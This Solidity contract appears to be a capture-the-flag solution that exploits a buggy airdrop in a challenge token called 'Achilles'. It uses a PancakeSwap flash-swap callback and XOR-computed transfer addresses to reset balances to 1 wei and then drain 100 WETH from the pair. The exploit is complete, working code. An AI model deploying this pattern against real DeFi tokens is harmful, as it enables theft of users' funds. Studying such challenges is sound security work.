//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {PancakePair, IPancakeCallee} from "./PancakeSwap.sol";
import {Achilles} from "./Achilles.sol";
import {WETH} from "./WETH.sol";
import {SetUp} from "./Setup.sol";

contract AchillesSolver is IPancakeCallee {
    PancakePair public immutable pair;
    Achilles public immutable achilles;
    WETH public immutable weth;
    SetUp public setup;

    constructor(address setup_) {
        setup = SetUp(setup_);
        pair = setup.pair();
        achilles = setup.achilles();
        weth = setup.weth();
    }

    function solve() external {
        // 1. Set airdrop amount to 1 wei
        setAirDropAmount();

        // 2. set pair achilles balance and solver balance to 1 wei
        setBalance();

        // 3. Swap achilles to weth
        swapWeth();
    }

    function setAirDropAmount() public {
        uint256 amount0Out = achilles.balanceOf(address(pair)) - 1;
        pair.swap(amount0Out, 0, address(this), bytes("0x0001"));
    }

    function setBalance() public {
        // set pair achilles balance to 1 wei
        achilles.transfer(_generateTransferTo(address(pair)), 0);

        // Set solver achilles balance to 1 wei
        achilles.transfer(_generateTransferTo(address(this)), 0);

        pair.sync();
    }

    function swapWeth() public {
        achilles.transfer(address(pair), achilles.balanceOf(address(this)));
        bytes memory emptyBytes;
        pair.swap(0, 100 ether, setup.yourAddress(), emptyBytes);
    }

    function pancakeCall(address, uint amount0, uint, bytes calldata) external {
        achilles.Airdrop(1);
        achilles.transfer(address(pair), amount0);
    }

    function _generateTransferTo(address seed) internal view returns (address) {
        // Setup seed address to th specific address
        // XOR property：
        // 1. a^b=c, c^b=a,
        // 2. a^a=0, 0^a=a
        // 3. a^b=b^a

        // Suppose to = (f|b)^(f^p), seed will equal to p. prove below:
        // seed = (f|b)^(f^to) = (f|b)^(f^(f|b)^(f^p)) = (f|b)^f^(f|b)^f^p
        // = (f|b)^(f|b)^f^f^p = p
        return
            address(
                uint160(
                    (uint160(address(this)) | block.number) ^
                        (uint160(address(this)) ^ uint160(address(seed)))
                )
            );
    }
}
